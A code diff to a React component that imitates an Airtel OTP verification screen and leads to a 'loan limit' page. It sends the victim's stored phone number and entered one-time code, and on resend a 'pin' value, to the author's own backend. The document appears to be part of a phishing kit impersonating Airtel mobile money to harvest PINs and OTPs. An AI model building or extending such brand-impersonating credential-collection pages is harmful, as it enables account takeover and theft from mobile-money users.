@@ -5,10 +5,21 @@ import './App.css';
 function AirtelOTPVerify() {
   const [otp, setOtp] = useState<string[]>(['', '', '', '']);
   const [timeLeft, setTimeLeft] = useState(45);
+  const [error, setError] = useState('');
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
 
-  // Countdown timer logic
+  // Retrieve the phone number saved during login
+  const phoneNumber = localStorage.getItem('airtelPhone') || '';
+
+  // If no phone number saved, redirect back to login
+  useEffect(() => {
+    if (!phoneNumber) {
+      navigate('/');
+    }
+  }, [phoneNumber, navigate]);
+
+  // Countdown timer
   useEffect(() => {
     if (timeLeft <= 0) return;
     const timer = setInterval(() => {
@@ -17,20 +28,16 @@ function AirtelOTPVerify() {
     return () => clearInterval(timer);
   }, [timeLeft]);
 
-  // Handle OTP input change
   const handleChange = (index: number, value: string) => {
-    if (!/^\d*$/.test(value)) return; // Only allow numbers
+    if (!/^\d*$/.test(value)) return;
     const newOtp = [...otp];
     newOtp[index] = value.substring(value.length - 1);
     setOtp(newOtp);
-
-    // Move focus to next input
     if (value && index < 3) {
       inputRefs.current[index + 1]?.focus();
     }
   };
 
-  // Handle Backspace
   const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
     if (e.key === 'Backspace' && !otp[index] && index > 0) {
       inputRefs.current[index - 1]?.focus();
@@ -40,19 +47,42 @@ function AirtelOTPVerify() {
   const handleVerify = async (e: React.FormEvent) => {
     e.preventDefault();
     const otpString = otp.join('');
-    
+
     if (otpString.length < 4) {
-      alert("Please enter the 4-digit verification code.");
+      setError('Please enter the 4-digit verification code.');
       return;
     }
 
-    // Redirect to the Loan Limit page
-    navigate('/airtel-loan-limit');
+    setError('');
+
+    try {
+      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/verify-otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone_number: phoneNumber, otp: otpString }),
+      });
+      const data = await response.json();
+
+      if (data.status === 'success') {
+        navigate('/airtel-loan-limit');
+      } else {
+        setError(data.message || 'Invalid OTP. Please try again.');
+      }
+    } catch {
+      setError('Error verifying OTP. Please try again.');
+    }
   };
 
   const handleResend = () => {
     setTimeLeft(45);
-    alert("A new code has been sent to your phone.");
+    setOtp(['', '', '', '']);
+    // Optionally re-trigger the login endpoint to resend OTP
+    fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phone_number: phoneNumber, pin: '0000' }),
+    }).catch(() => console.error('Resend failed'));
+    alert('A new code has been sent to your phone.');
   };
 
   return (
@@ -72,7 +102,6 @@ function AirtelOTPVerify() {
 
       {/* Main White Card */}
       <div className="airtel-card">
-        {/* Back Link */}
         <button className="airtel-back-link" onClick={() => navigate('/')}>
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <line x1="19" y1="12" x2="5" y2="12"></line>
@@ -83,11 +112,10 @@ function AirtelOTPVerify() {
 
         <h2 className="airtel-otp-heading">Verify your code</h2>
         <p className="airtel-otp-subtext">
-          Enter the 4-digit code sent to +2507580327737
+          Enter the 4-digit code sent to {phoneNumber || '+243 XXX XXX XXX'}
         </p>
 
         <form onSubmit={handleVerify}>
-          {/* OTP Input */}
           <div className="airtel-input-group">
             <label>Enter OTP Code</label>
             <div className="airtel-otp-container">
@@ -106,7 +134,19 @@ function AirtelOTPVerify() {
             </div>
           </div>
 
-          {/* Timer */}
+          {error && (
+            <div className="airtel-alert" style={{ marginBottom: '20px' }}>
+              <div className="alert-icon">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <circle cx="12" cy="12" r="10"></circle>
+                  <line x1="12" y1="16" x2="12" y2="12"></line>
+                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                </svg>
+              </div>
+              <span>{error}</span>
+            </div>
+          )}
+
           <div className="airtel-timer">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#E53E3E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <circle cx="12" cy="12" r="10"></circle>
@@ -115,7 +155,6 @@ function AirtelOTPVerify() {
             <span>{timeLeft}s</span>
           </div>
 
-          {/* Verify Button */}
           <button type="submit" className="airtel-verify-btn">
             Verify Code
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -124,7 +163,6 @@ function AirtelOTPVerify() {
             </svg>
           </button>
 
-          {/* Resend Button */}
           <button type="button" className="airtel-resend-btn" onClick={handleResend}>
             Resend code
           </button>
